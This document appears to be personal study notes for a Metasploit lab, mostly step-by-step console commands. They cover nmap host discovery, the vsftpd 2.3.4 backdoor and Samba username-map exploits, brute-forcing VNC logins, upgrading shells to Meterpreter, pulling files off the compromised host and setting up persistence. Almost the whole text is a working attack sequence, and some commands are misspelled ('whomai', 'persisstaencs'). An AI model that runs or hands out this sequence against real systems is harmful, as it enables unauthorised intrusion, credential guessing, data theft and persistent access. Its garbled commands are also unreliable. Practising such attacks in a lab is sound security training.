# ================================  METASPLOIT ================================


# Target identification and Host discovery


#   ● > nmap -sn 192.168.0.1 (Host UP / DOWN)

#   ● > nmap -sv 192.168.0.1 (Port Scanning & Service Detection)


# ==============================================================================


# Exploiting Vulnerabilites

#   ● > use exploit/unix/ftp/vsftpd_234_backdoor

#   ● > set RHOSTS

#   ● > show payloads

#   ● > exploit

#   ● > whoami (depend which sys exploit window or linux)

#   ● > background

#   ● > 

#   ● > 



# ==============================================================================

# Exploiting samba smb


#   ● > search smb_version

#   ● > use 0

#   ● > show options

#   ● > set RHOSTS Target_IP

#   ● > set THREADS 16 (the THREADS determine how fast will the program run)

#   ● > run


# ==============================================================================

# Exploiting samba smb(Cont.)


#   ● > search username map script

#   ● > use 1

#   ● > show options

#   ● > set RHOSTS Target_IP

#   ● > exploit

#   ● > whomai


# ==============================================================================


# Exploiting VNC

#   ● > search scanner vnc

#   ● > use 3

#   ● > info

#   ● > set RHOSTS Target_IP

#   ● > set STOP_ON_SUCCESS true

#   ● > set THREADS 32

#   ● > set USER_AS_PASS true

#   ● > run 

#   ● > vncviewer Target_IP


# ==============================================================================


# What is Meterpreter :- metasploit payload

#   ● Upgrade to a meterpreter from shell

#   ● > sessions

#   ● > search shell to meterpreter upgrade

#   ● > use 0

#   ● > show options

#   ● > Set SESSION 4

#   ● > Exploit

#   ● > Sessions




# ==============================================================================


#   ● > sessions -i 3

# Metasploit functionalities

#   ● > search -f licence.txt

#   ● > download /var/www/tikiwiki-old/licence.txt

#   ● > shell

#   ● > arp, ifconfig , netstat, etc

#   ● > ps

#   ● > getpid

#   ● >


# Staying persistently on the exploited machine

#   ● > run persisstaencs (window)
























